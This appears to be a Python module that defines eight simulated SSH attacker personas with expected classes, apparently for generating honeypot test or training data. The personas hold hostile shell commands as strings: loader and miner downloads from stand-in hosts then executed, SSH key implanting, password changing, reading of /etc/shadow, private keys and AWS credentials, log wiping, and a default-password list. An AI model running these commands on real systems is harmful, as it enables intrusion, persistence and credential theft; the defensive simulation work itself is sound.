"""Eight SAFE fake attacker personas.

Every persona is a script of commands that LOOKS like real attacker behaviour
seen on SSH honeypots, but:

* all IPs are RFC 5737 documentation addresses (192.0.2.x, 198.51.100.x,
  203.0.113.x) that do not exist on the internet,
* all domains end in ``.invalid`` or ``.test`` (reserved, never resolve),
* no real malware, exploit, EICAR string or real mining pool is used,
* miner "wallets" are obviously fake strings.

So even if a command ran on a real machine it could not reach anything.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class Persona:
    """A fake attacker profile."""

    name: str
    description: str
    style: str  # "bot" (fast, scripted) or "human" (slow, uneven)
    client_version: str
    logins: tuple[tuple[str, str], ...]  # tried in order; the honeypot decides success
    commands: tuple[str, ...] = ()
    downloads: tuple[str, ...] = ()  # URLs (synthetic mode records them as download events)
    expected_class: str = "unknown"
    weight: int = 1  # how common in synthetic data
    tags: tuple[str, ...] = field(default_factory=tuple)


BRUTE_LIST = (
    ("root", "root"), ("root", "123456"), ("admin", "password"), ("root", "password"),
    ("user", "user"), ("test", "test"), ("oracle", "oracle"), ("ubuntu", "123"),
    ("postgres", "postgres"), ("git", "git"), ("root", "toor"), ("admin", "1234"),
)

PERSONAS: tuple[Persona, ...] = (
    Persona(
        name="scanner",
        description="Connects, reads the SSH banner, leaves. The most common internet noise.",
        style="bot",
        client_version="SSH-2.0-Go",
        logins=(),
        expected_class="scanner",
        weight=6,
    ),
    Persona(
        name="brute-forcer",
        description="Tries many common passwords and never gets in (no correct password in its list).",
        style="bot",
        client_version="SSH-2.0-libssh2_1.10.0",
        logins=BRUTE_LIST,
        expected_class="brute-forcer",
        weight=5,
    ),
    Persona(
        name="recon-bot",
        description="Logs in and fingerprints the machine: CPU, OS, users, network.",
        style="bot",
        client_version="SSH-2.0-paramiko_3.4.0",
        logins=(("root", "root"), ("admin", "admin")),
        commands=(
            "uname -a", "cat /proc/cpuinfo | grep name | wc -l", "whoami", "cat /etc/os-release",
            "free -m", "ifconfig", "ps aux", "w", "crontab -l", "ls -la /tmp",
            "lscpu | grep Model", "echo 'probe-ok'",
        ),
        expected_class="intruder",
        weight=4,
    ),
    Persona(
        name="mirai-loader",
        description="IoT (Internet of Things) botnet style: busybox, tftp/wget a loader, chmod, run, delete.",
        style="bot",
        client_version="SSH-2.0-libssh-0.9.6",
        logins=(("root", "xc3511"), ("admin", "admin")),
        commands=(
            "enable", "system", "shell", "sh", "/bin/busybox ECCHI",
            "cd /tmp || cd /var/run || cd /dev/shm",
            "wget http://198.51.100.23/bins/x86.sh -O loader.sh",
            "tftp -g -r mips 198.51.100.23",
            "chmod 777 loader.sh; ./loader.sh ssh.loader",
            "rm -rf /tmp/loader.sh",
        ),
        downloads=("http://198.51.100.23/bins/x86.sh",),
        expected_class="malware-dropper",
        weight=3,
    ),
    Persona(
        name="cryptominer-dropper",
        description="Kills rival miners, downloads a fake miner, tunes huge pages, adds cron persistence.",
        style="bot",
        client_version="SSH-2.0-OpenSSH_8.4p1",
        logins=(("root", "admin123"),),
        commands=(
            "nproc", "cat /proc/cpuinfo | grep -c processor",
            "pkill -9 kdevtmpfsi; killall xmrig",
            "mkdir /tmp/.ice-unix2 && cd /tmp/.ice-unix2",
            "curl -s -O http://payload.invalid/miner/kswapd0",
            "echo 1280 > /proc/sys/vm/nr_hugepages",
            "chmod +x kswapd0; ./kswapd0 -o stratum+tcp://pool.invalid:3333 -u FAKE-WALLET-FOR-DEMO --donate-level 1 -B",
            "(crontab -l; echo '*/5 * * * * /tmp/.ice-unix2/kswapd0') | crontab -",
        ),
        downloads=("http://payload.invalid/miner/kswapd0",),
        expected_class="cryptominer-like",
        weight=2,
    ),
    Persona(
        name="ssh-key-implant",
        description="Adds an attacker SSH key, makes it immutable and changes the password (persistence).",
        style="bot",
        client_version="SSH-2.0-Go",
        logins=(("root", "admin123"),),
        commands=(
            "cd ~; chattr -ia .ssh; lockr -ia .ssh",
            "rm -rf .ssh && mkdir .ssh",
            "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ-FAKE-DEMO-KEY demo@example.invalid' >> .ssh/authorized_keys",
            "chmod -R go= ~/.ssh",
            "chattr +ia ~/.ssh/authorized_keys",
            "echo 'root:Fake-Changed-Pass-123' | chpasswd",
            "cat /etc/shadow",
        ),
        expected_class="intruder",
        weight=3,
    ),
    Persona(
        name="honeypot-prober",
        description="Checks whether it is inside a honeypot or virtual machine, then leaves.",
        style="human",
        client_version="SSH-2.0-OpenSSH_9.6",
        logins=(("ubuntu", "ubuntu"),),
        commands=(
            "cat /proc/1/cgroup", "systemd-detect-virt", "ls /home/cowrie", "dmidecode -s system-product-name",
        ),
        expected_class="honeypot-prober",
        weight=1,
    ),
    Persona(
        name="log-wiper",
        description="Human-paced intruder who disables history, steals keys and wipes logs.",
        style="human",
        client_version="SSH-2.0-PuTTY_Release_0.81",
        logins=(("pi", "raspberry"),),
        commands=(
            "unset HISTFILE", "id", "cat ~/.ssh/id_rsa", "cat ~/.aws/credentials",
            "grep -ri password /var/www", "echo > /var/log/wtmp", "cat /dev/null > ~/.bash_history",
            "history -c", "iptables -F", "exit",
        ),
        expected_class="intruder",
        weight=1,
    ),
)

PERSONA_BY_NAME = {p.name: p for p in PERSONAS}
